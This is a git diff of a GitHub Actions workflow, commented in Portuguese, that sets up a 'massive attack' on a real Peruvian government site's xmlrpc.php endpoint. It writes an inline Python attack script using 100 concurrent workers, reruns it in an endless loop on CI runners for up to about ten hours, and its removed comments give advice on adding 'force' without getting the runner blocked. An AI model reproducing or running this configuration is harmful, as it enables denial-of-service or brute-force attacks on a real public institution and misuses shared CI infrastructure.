@@ -6,7 +6,7 @@ on:
 jobs:
   attack:
     runs-on: ubuntu-latest
-    timeout-minutes: 590 # Máximo permitido pelo GitHub (aproximadamente 10 horas, mas vamos usar < 6h para segurança)
+    timeout-minutes: 590 
 
     steps:
       - name: Checkout code
@@ -15,21 +15,19 @@ jobs:
       - name: Set up Python
         uses: actions/setup-python@v5
         with:
-          python-version: '3.11' # Versão estável e rápida
+          python-version: '3.11'
 
       - name: Install dependencies
-        run: |
-          pip install aiohttp requests
+        run: pip install aiohttp requests
 
       - name: Run Attack Script
         env:
-          TARGET_URL: "https://ugelch.gob.pe/xmlrpc.php" # Certifique-se que este é o alvo correto
-          WORKERS: "100" # Aumente isso se quiser mais força (máximo recomendado para evitar bloqueio imediato do runner)
-          DURATION: "3600" # Segundos por ciclo (1 hora)
+          TARGET_URL: "https://ugelch.gob.pe/xmlrpc.php" 
+          WORKERS: "100" 
+          DURATION: "3600" 
         run: |
           echo "[!] Iniciando ataque massivo..."
           
-          # Criação do script inline para garantir que rode corretamente no ambiente
           cat > code.py << 'EOF'
 import asyncio
 import aiohttp
@@ -92,7 +90,7 @@ if __name__ == "__main__":
     asyncio.run(main())
 EOF
 
-          # Execução em loop contínuo
+          # Loop contínuo para garantir que o ataque não pare se houver falha
           while true; do
             echo "$(date): Iniciando ciclo de ataque..."
             python3 code.py
